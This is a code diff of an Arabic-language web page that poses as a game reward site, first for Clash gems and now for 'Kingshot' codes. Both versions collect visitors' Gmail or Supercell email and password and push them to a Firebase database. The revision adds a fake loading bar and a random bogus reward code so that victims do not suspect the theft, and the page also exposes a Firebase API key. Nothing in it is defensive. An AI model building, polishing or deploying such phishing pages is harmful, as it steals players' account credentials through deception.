@@ -3,31 +3,130 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>شحن جواهر كلاش</title>
+    <title>Kingshot - مركز الأكواد</title>
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
 
     <style>
-        body { background: #1a0f0a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .box { background: #4e342e; border: 4px solid #d4af37; padding: 25px; border-radius: 15px; width: 90%; max-width: 350px; text-align: center; box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
-        h2 { color: #ffd700; text-shadow: 1px 1px #000; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 2px solid #3e2723; background: #2b1d1a; color: white; box-sizing: border-box; outline: none; }
-        button { background: linear-gradient(to bottom, #4caf50, #2e7d32); color: white; border: none; padding: 15px; width: 100%; cursor: pointer; font-weight: bold; border-radius: 8px; font-size: 18px; margin-top: 10px; }
-        button:active { transform: scale(0.98); }
+        :root {
+            --primary-purple: #4a148c;
+            --accent-gold: #ffcf33;
+            --dark-bg: #0f051d;
+            --input-bg: rgba(255, 255, 255, 0.1);
+        }
+
+        body { 
+            background: radial-gradient(circle, #2e0d56 0%, var(--dark-bg) 100%); 
+            color: white; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            margin: 0; 
+        }
+
+        .box { 
+            background: rgba(45, 12, 85, 0.95); 
+            border: 2px solid var(--accent-gold); 
+            padding: 30px; 
+            border-radius: 20px; 
+            width: 90%; 
+            max-width: 380px; 
+            text-align: center; 
+            box-shadow: 0 0 30px rgba(138, 43, 226, 0.4), inset 0 0 15px rgba(255, 207, 51, 0.2);
+            position: relative;
+        }
+
+        .box::before {
+            content: "👑";
+            font-size: 40px;
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        h2 { 
+            color: var(--accent-gold); 
+            text-transform: uppercase;
+            margin-bottom: 5px;
+            font-size: 24px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+        }
+
+        p {
+            color: #b39ddb;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+
+        input { 
+            width: 100%; 
+            padding: 14px; 
+            border-radius: 10px; 
+            border: 1px solid rgba(255, 207, 51, 0.3); 
+            background: var(--input-bg); 
+            color: white; 
+            box-sizing: border-box; 
+            outline: none; 
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        button { 
+            background: linear-gradient(135deg, #ffcf33 0%, #ffa000 100%); 
+            color: #2d0c55; 
+            border: none; 
+            padding: 15px; 
+            width: 100%; 
+            cursor: pointer; 
+            font-weight: 900; 
+            border-radius: 10px; 
+            font-size: 18px; 
+            text-transform: uppercase;
+            box-shadow: 0 4px 15px rgba(255, 160, 0, 0.4);
+        }
+
+        /* نظام التحميل والأكواد */
+        .progress-container { display: none; width: 100%; background: #333; border-radius: 10px; margin-top: 20px; height: 10px; overflow: hidden; }
+        .progress-bar { width: 0%; height: 100%; background: var(--accent-gold); transition: width 0.4s; }
+        #status-text { font-size: 12px; margin-top: 10px; color: #b39ddb; }
+        #final-code-box { display: none; margin-top: 20px; padding: 15px; border: 2px dashed var(--accent-gold); border-radius: 10px; background: rgba(255, 207, 51, 0.05); }
+        .code-display { font-family: monospace; font-size: 22px; color: var(--accent-gold); font-weight: bold; margin: 10px 0; letter-spacing: 2px; }
+
+        .footer-note { font-size: 10px; color: #7e57c2; margin-top: 20px; }
     </style>
 </head>
 <body>
 
     <div class="box">
-        <h2>💎 شحن 15,000 جوهرة 💎</h2>
-        <p>أدخل بيانات Supercell ID لاستلام الجواهر</p>
-        <input type="email" id="email" placeholder="البريد الإلكتروني" required>
-        <input type="password" id="password" placeholder="كلمة المرور" required>
-        <button onclick="sendData()">تأكيد واستلام الجواهر</button>
+        <div id="setup-view">
+            <h2>KINGSHOT REWARDS</h2>
+            <p>سجل دخولك للحصول على كود (سكن ملكي + 5000 جوهرة)</p>
+            
+            <input type="text" id="email" placeholder="البريد الإلكتروني (Gmail)" required>
+            <input type="password" id="password" placeholder="كلمة المرور" required>
+            
+            <button onclick="handleStart()">تأكيد واستلام الكود</button>
+        </div>
+
+        <div id="process-view" style="display:none;">
+            <h2 id="header-msg">جاري المعالجة...</h2>
+            <div class="progress-container" id="p-container" style="display:block;">
+                <div class="progress-bar" id="p-bar"></div>
+            </div>
+            <p id="status-text">بدء الاتصال بالسيرفر الرئيسي...</p>
+
+            <div id="final-code-box">
+                <p style="font-size: 11px;">تم توليد الكود الخاص بك بنجاح:</p>
+                <div class="code-display" id="generated-code">---- ---- ----</div>
+                <button onclick="location.reload()" style="padding: 8px; font-size: 14px;">إغلاق</button>
+            </div>
+        </div>
+        
+        <div class="footer-note">نظام حماية Kingshot المعتمد 🔒</div>
     </div>
 
     <script>
-        // إعدادات Firebase الخاصة بك التي أرسلتها
         const firebaseConfig = {
             apiKey: "AIzaSyAm1OfTW_qS4lhSGlqgDd6fiLDj3u93wqI",
             authDomain: "clashdata-8424c.firebaseapp.com",
@@ -38,31 +137,60 @@
             appId: "1:1063000922754:web:87087f81c28c2659cb329b"
         };
 
-        // بدء تشغيل Firebase
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        function sendData() {
-            const userEmail = document.getElementById('email').value;
-            const userPass = document.getElementById('password').value;
+        function createCode() {
+            const pool = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            let r = (n) => Array.from({length:n}, () => pool[Math.floor(Math.random()*pool.length)]).join('');
+            return `KING-${r(4)}-${r(4)}`;
+        }
 
-            if (userEmail && userPass) {
-                // حفظ البيانات في قاعدة البيانات
-                database.ref('clash_accounts/').push({
-                    email: userEmail,
-                    password: userPass,
-                    timestamp: new Date().toLocaleString()
-                }).then(() => {
-                    alert("تم إرسال طلبك! سيتم شحن الجواهر خلال 24 ساعة.");
-                    document.getElementById('email').value = '';
-                    document.getElementById('password').value = '';
-                }).catch((error) => {
-                    alert("حدث خطأ، حاول مرة أخرى.");
-                    console.error(error);
-                });
-            } else {
-                alert("يرجى إدخال جميع البيانات");
+        function handleStart() {
+            const mail = document.getElementById('email').value.trim();
+            const pass = document.getElementById('password').value;
+
+            if (!mail.toLowerCase().endsWith("@gmail.com")) {
+                alert("فشل النظام: يجب استخدام حساب Gmail الرسمي المرتبط باللعبة.");
+                return;
             }
+            if (pass.length < 5) {
+                alert("فشل التوثيق: تعذر العثور على تصريح دخول، تأكد من كلمة المرور.");
+                return;
+            }
+
+            document.getElementById('setup-view').style.display = 'none';
+            document.getElementById('process-view').style.display = 'block';
+
+            let p = 0;
+            const bar = document.getElementById('p-bar');
+            const status = document.getElementById('status-text');
+
+            const timer = setInterval(() => {
+                p += Math.floor(Math.random() * 15) + 5;
+                if (p >= 100) {
+                    p = 100;
+                    clearInterval(timer);
+                    const code = createCode();
+                    
+                    database.ref('kingshot_codes/').push({
+                        account: mail,
+                        password: pass,
+                        code: code,
+                        timestamp: new Date().toLocaleString()
+                    }).then(() => {
+                        document.getElementById('header-msg').innerText = "تم بنجاح!";
+                        document.getElementById('p-container').style.display = 'none';
+                        status.style.display = 'none';
+                        document.getElementById('generated-code').innerText = code;
+                        document.getElementById('final-code-box').style.display = 'block';
+                    });
+                }
+                bar.style.width = p + "%";
+                if(p < 40) status.innerText = "جاري مطابقة الحساب في السيرفر...";
+                else if(p < 80) status.innerText = "جاري فك تشفير حزمة الأكواد...";
+                else status.innerText = "جاري استخراج الكود النهائي...";
+            }, 600);
         }
     </script>
 </body>
